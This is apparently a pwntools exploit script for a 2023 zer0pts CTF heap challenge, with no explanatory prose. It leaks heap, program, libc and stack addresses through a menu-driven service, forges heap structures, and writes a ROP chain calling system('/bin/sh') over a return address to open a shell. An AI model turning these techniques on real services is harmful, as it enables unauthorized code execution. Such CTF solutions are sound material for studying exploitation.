from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'
context.arch = 'amd64'


parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "pwn.2023.zer0pts.com"
    port = 9001
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()


# libc safe linking decrypt
def decrypt(cipher):
    key = 0
    plain  = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def encrypt(val, addr):
    return val ^ (addr >> 12)


####################################

def menu(choice):
    recvuntil(b'>')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b': '):
    recvuntil(r)
    #s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r
def sa(r, s, new_line=True):
    rs(s, new_line, r)

def add(name):
  menu(1)
  rs(name)
  recvuntil(b"ID: ")
  return int(recvline())

def update(id, name):
  menu(2)
  rs(str(id).encode("ascii"))
  rs(name)

def get_info():
    recvuntil(b"ID: ")
    id = int(recvline())
    recvuntil(b"Name: ")
    name = recvline()
    return (id, name)

def print_list(do_print=False):
    menu(3)
    citizens = []
    while True:
      if recv(1).startswith(b">"):
          break
      (id, name) = get_info()
      if do_print:
          print(f"{id}: {name}")
      citizens.append((id, name))
    sendline(b"3")
    return citizens

def mark(id):
  menu(4)
  rs(str(id).encode("ascii"))
  #recvuntil(b"[+] Marked '")
  #name = recvuntil(b"'")
  #return name

def give_id(id):
  menu(5)
  rs(str(id).encode("ascii"))

def print_spy():
    menu(6)
    return get_info()

"""
a_id = add("A")
b_id = add("B")
update(b_id, "BB")
print_list()
c_id = add("C")
s = mark(c_id)
print(s)
assert(mark(c_id) == b"C")
give_id(123)
assert(print_spy()[0] == 123)
"""

a_id = add("A")
print(f"a_id: {hex(a_id)}")
mark(a_id)
for i in range(3):
    add("A")

heap_base = print_spy()[0]
print(f"heap_addr: {hex(heap_base)}")
#array_buf_addr = heap_base + 0x1a00
#string_array_addr =
#string_array = heap_base - 0x4100
#print(f"array_buf_addr: {hex(array_buf_addr)}")
#print(f"string_array: {hex(string_array)}")
int_array = heap_base - 0x30e0
string_array = int_array - 0x20
print(f"int_array: {hex(int_array)}")

for i in range(39):
    add("A")
mark(a_id)
print(print_spy())
for i in range(5):
    add("A")
add("A")
wait_for_attach()
add("A")
print(print_spy())

wait_for_attach()

target = int_array + 32 - 0x1b0 + 0x10
print(f"target: {hex(target)}")
# print(target)
# interactive()
give_id(target)
add("A" * 0x1b0)
wait_for_attach()
victim = heap_base + 0x13f20

def to_h(x):
    return x - 0x7f7e4eb5ef80 + heap_base
'''
0x7f7e4eb5be40:	0x000000000000008b	0x0000000400000001
0x7f7e4eb5be50:	0x00007f7e4eb60ed0	0x0000000000000000
0x7f7e4eb5be60:	0x000000000000008b	0x0000000400000001
0x7f7e4eb5be70:	0x00007f7e4eb60f00	0x0000000000000000
0x7f7e4eb5be80:	0x0000003100000004	0x0000000000000060
0x7f7e4eb5be90:	0x00007f7e4eb79c80	0x0000000000000000
0x7f7e4eb5bea0:	0x000000310000001a	0x0000000000000060
0x7f7e4eb5beb0:	0x00007f7e4eb78c80	0x0000000000000000
'''
payload = [
  0x000000000000008b, 0x0000000400000001,
  to_h(0x00007f7e4eb60ed0), 0,
  0x000000030000008b, 0x0000000400000000,
  to_h(0x00007f7e4eb60f00), 0x0000000000000000,
  0x0000000400000004, 0x0000000000000060,
  to_h(0x00007f7e4eb79c80), 0x0000000000000000,
  0x000000040000001a, 0x0000000000000060,
  to_h(0x00007f7e4eb78c80), 0x0000000000000000,
  0x000000000000008b, 0x0000000000000000
]
payload[-4] = int_array
payload = b''.join(map(p64, payload))
payload = b"\x00" * (0x1b0 - len(payload) - 12) + payload
add(payload)

mark(int_array)
prog_addr = heap_base - 0x15c0
give_id(prog_addr)
#interactive()

update(0, "hoge")
l = print_list(do_print=False)
prog_base = l[0][0] - 0x103e10
print(f"prog_base: {hex(prog_base)}")

printf_got = prog_base + 0x129c10
give_id(printf_got)
l = print_list(do_print=False)
if is_gaibu:
  # <__printf>
  libc_base = l[0][0] - 0x60770
  environ = libc_base + 0x221200
  binsh = libc_base + 0x1d8698
  system = libc_base + 0x50d60
else:
  # <__printf>
  libc_base = l[0][0] - 0x60770
  environ = libc_base + 0x221200
  binsh = libc_base + 0x1d8698
  system = libc_base + 0x50d60

pop_rdi_ret = prog_base + 0x5dbc4
ret = pop_rdi_ret + 1

print(f"libc_base: {hex(libc_base)}")

give_id(environ)
l = print_list(do_print=False)
stack_addr = l[0][0]
print(f"stack_addr: {hex(stack_addr)}")

ret_addr = stack_addr - 0x190
current_val = prog_base + 0xea1a9
give_id(ret_addr)
mark(current_val)
give_id(pop_rdi_ret)
mark(0)
give_id(binsh)
mark(0)
give_id(ret)
mark(0)
give_id(system)

print(f"stack: {hex(ret_addr)}")
print(f"current_val: {hex(current_val)}")


interactive()
